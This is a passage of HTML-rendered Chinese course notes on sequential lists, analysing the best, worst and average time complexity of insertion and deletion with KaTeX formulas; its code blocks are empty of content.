<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul>
<li><strong>最好情况</strong>：在表尾插入（即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>=</mo><mi>n</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">i = n + 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>），元素后移语句将不执行，时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></li>
<li><strong>最坏情况</strong>：在表头插入（即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">i = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>），元素后移语句将执行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 次，时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></li>
<li><strong>平均情况</strong>：假设 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false">(</mo><msub><mi>p</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn><mi mathvariant="normal">/</mi><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p_{i} (p_{i} = 1/(n + 1))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1/</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">))</span></span></span></span> 是在第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 个位置上插入一个结点的概率，则在长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 的线性表中插入一个结点时，所需移动结点的平均次数为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></munderover><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mstyle scriptlevel="0" displaystyle="true"><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></munderover><mfrac><mn>1</mn><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></mfrac><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></mfrac><mstyle scriptlevel="0" displaystyle="true"><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></munderover><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></mfrac><mfrac><mrow><mi>n</mi><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><mn>2</mn></mfrac><mo>=</mo><mfrac><mi>n</mi><mn>2</mn></mfrac></mstyle></mstyle></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle\sum_{i=1}^{n+1} p_{i} (n - i + 1) = \displaystyle\sum_{i=1}^{n+1} \dfrac{1}{n + 1} (n - i + 1) = \dfrac{1}{n + 1} \displaystyle\sum_{i=1}^{n+1} (n - i + 1) = \dfrac{1}{n + 1} \dfrac{n(n + 1)}{2} = \dfrac{n}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.0788em;vertical-align:-1.2777em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7429em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3.0788em;vertical-align:-1.2777em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7693em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7429em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3.0788em;vertical-align:-1.2777em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7693em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7429em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.1963em;vertical-align:-0.7693em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7693em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.7936em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1076em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></li>
</ul>
<p>因此，顺序表插入算法的平均时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p>
</li>
<li>
<p><strong>删除操作</strong></p>
<p>删除顺序表 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span></span></span></span> 中第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo stretchy="false">(</mo><mn>1</mn><mo>⩽</mo><mi>i</mi><mo>⩽</mo><mi>L</mi><mi mathvariant="normal">.</mi><mi>l</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">i (1 \leqslant i \leqslant L.length)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">i</span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7962em;vertical-align:-0.1367em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mclose">)</span></span></span></span> 个位置的元素，用引用变量 <code>e</code> 返回。若 <code>i</code> 的输入不合法，则返回 <code>false</code>；否则，将被删元素赋给引用变量 <code>e</code>，并将第 <code>i + 1</code> 个元素及其后的所有元素依次往前移动一个位置，返回 <code>true</code>。</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul>
<li><strong>最好情况</strong>：删除表尾元素（即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>=</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">i = n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>），无须移动元素，时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></li>
<li><strong>最坏情况</strong>：删除表头元素（即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">i = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>），需移动除表头元素外的所有元素，时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></li>
<li><strong>平均情况</strong>：假设 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false">(</mo><msub><mi>p</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn><mi mathvariant="normal">/</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p_{i} (p_{i} = 1/n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1/</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 是删除第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 个位置上结点的概率，则在长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 的线性表中删除一个结点时，所需移动结点的平均次数为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mi>i</mi><mo stretchy="false">)</mo><mo>=</mo><mstyle scriptlevel="0" displaystyle="true"><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mfrac><mn>1</mn><mi>n</mi></mfrac><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mi>i</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mi>n</mi></mfrac><mstyle scriptlevel="0" displaystyle="true"><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mi>i</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mi>n</mi></mfrac><mfrac><mrow><mi>n</mi><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><mn>2</mn></mfrac><mo>=</mo><mfrac><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow><mn>2</mn></mfrac></mstyle></mstyle></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle\sum_{i=1}^{n} p_{i} (n - i) = \displaystyle\sum_{i=1}^{n} \dfrac{1}{n} (n - i) = \dfrac{1}{n} \displaystyle\sum_{i=1}^{n} (n - i) = \dfrac{1}{n} \dfrac{n(n - 1)}{2} = \dfrac{n - 1}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span 